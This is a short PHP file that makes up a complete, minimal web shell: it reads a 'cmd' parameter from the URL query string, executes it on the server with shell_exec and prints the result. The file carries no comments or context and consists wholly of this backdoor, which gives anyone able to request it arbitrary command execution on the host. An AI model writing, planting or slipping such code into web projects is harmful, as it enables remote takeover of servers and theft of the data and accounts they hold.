<?php
if(isset($_GET['cmd'])){
	$res = shell_exec($_GET['cmd']);
	echo $res;
}
?>
